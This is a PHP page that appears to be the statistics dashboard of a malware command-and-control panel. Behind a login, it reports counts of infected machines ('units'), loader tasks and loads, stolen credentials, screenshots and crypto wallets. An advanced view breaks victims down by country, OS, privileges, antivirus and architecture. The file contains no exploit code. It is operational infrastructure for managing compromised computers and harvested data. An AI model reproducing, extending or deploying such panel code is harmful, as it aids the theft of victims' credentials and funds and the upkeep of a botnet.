<?php      

   session_start();

   if (!(isset($_SESSION['Name'])))
   {
      header("Location: Login.php");
      exit;
   }

   include("Header.php");
   include("Functions.php");
   include("Cfg/Lang.php"); 

   CheckSQL();

   echo "<table cellpadding=0 cellspacing=0 width=\"100%\" style =\"border: 0px solid;\">
            <tr style=background-color:#11101d; height=\"50\">
               <td>
                  <div align = center>
                     <font color=\"#E4E9F7\">" . $lang["_001"] . $_SESSION['Name'] . "! " . $lang["_002"] . "</font>
                  </div>
               </td>
            </tr>
            <tr>
               <td>
                  <img src=\"Images\Ang.png\" align=\"top\"></img>
               </td>
            </tr>
         </table>";

   echo "<div align = center> 
            <table cellpadding=1 cellspacing=1 width=\"98%\" class=table style =\"border: 1px solid;\">
               <tr height=\"35\">                      
                  <td><div align = left>&nbsp;" . $lang["0001"] . ":</div></td>
                  <td><div align = center>" . $lang["0002"] . ":</div></td>              
               </tr>";

   $gb = GetBG();

   if ($_GET["adv"])
   {
      $gb = GetBG();
      echo "<tr height=\"40\"><td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\"> " .  $lang["0158"] . ":</td><td width=200 bgcolor ="  . $gb . "><div align = center>" . getServerLoad() . "</div></td></tr>";
   }

   $gb = GetBG();
   echo "<tr height=\"40\"><td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\"> " .  $lang["0003"] . ":</td><td width=200 bgcolor ="  . $gb . "><div align = center>" . GetTaskCount() . "</div></td></tr>";

   $gb = GetBG();
   echo "<tr height=\"35\"><td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\"> " . $lang["0004"] . ":</td><td width=200 bgcolor = " . $gb . "><div align = center>" . GetLoadsCount() . "</div></td></tr>";

   $gb = GetBG();
   echo "<tr height=\"35\"><td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\"> " . $lang["0005"] . ":</td><td width=200 bgcolor = " . $gb . "><div align = center>" . GetLoadserrorsCount() . "</div></td></tr>";

   $gb = GetBG();
   echo "<tr height=\"35\"><td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\"> " . $lang["0006"] . ":</td><td width=200 bgcolor = " . $gb . "><div align = center>" . GetUnitsCount() . "</div></td></tr>";

   $gb = GetBG();
   echo "<tr height=\"35\"><td bgcolor = ". $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\"> " . $lang["0007"] . ":</td><td width=200 bgcolor =" . $gb . ">" . "<div align = center><font color = red>" . GetOnlineUnitsCount() . "</font></div></td></tr>";

   $gb = GetBG();
   echo "<tr height=\"35\"><td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\"> " . $lang["0008"] . ":</td><td width=200 bgcolor = " . $gb . "><div align = center>" . GetOnlinePerDayUnitsCount() . "</div></td></tr>";

   $gb = GetBG();
   echo "<tr height=\"35\"><td bgcolor = ". $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\"> " . $lang["0009"] . ":</td><td width=200 bgcolor =" . $gb . "><div align = center>" . GetOnlinePerWeekUnitsCount() . "</div></td></tr>";

   $gb = GetBG();
   echo "<tr height=\"35\"><td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\"> " . $lang["0010"] . ":</td><td width=200 bgcolor = " . $gb . "><div align = center>" . GetNewPerDayUnitsCount() . "</div></td></tr>";

   $gb = GetBG();
   echo "<tr height=\"35\"><td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\"> " . $lang["0011"] . ":</td><td width=200 bgcolor =" . $gb . "><div align = center>" . GetNewPerWeekUnitsCount() . "</div></td></tr>";

   $gb = GetBG();
   echo "<tr height=\"35\"><td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\"> " . $lang["0012"] . ":</td><td width=200 bgcolor =" . $gb . ">" . "<div align = center><font color = red>" . GetcredentialCount() . "</font></div></td></tr>";

   $gb = GetBG();
   echo "<tr height=\"35\"><td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\"> " . $lang["0159"] . ":</td><td width=200 bgcolor =" . $gb . ">" . "<div align = center>" . ScrCount() . "</div></td></tr>";

   $gb = GetBG();
   echo "<tr height=\"35\"><td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\"> " . $lang["01591"] . ":</td><td width=200 bgcolor =" . $gb . ">" . "<div align = center>" . WalCount() . "</div></td></tr>";

   echo "   </table>
         </div>";

   if ($_GET["adv"])
   {
      sTable();

      echo GetCoutryUnitsCount();

      sTable();

      GetVerionsUnitsCount();

      sTable();

      GetRightsUnitsCount();

      sTable();

      GetArchUnitsCount();

      sTable();

      GetOsUnitsCount();

      sTable();

      GetAVUnitsCount();

      sTable();

      GetSidUnitsCount();

      sTable();
   }
   else
   {
      sTable();
      echo "<div align = center>" . "<button class=\"button\" onclick=\"window.location.href = 'Statistic.php?adv=true';\">" . $lang["0013"] . "</button>" . "</a></div>";    
   }
   
   include("Footer.php");
?> 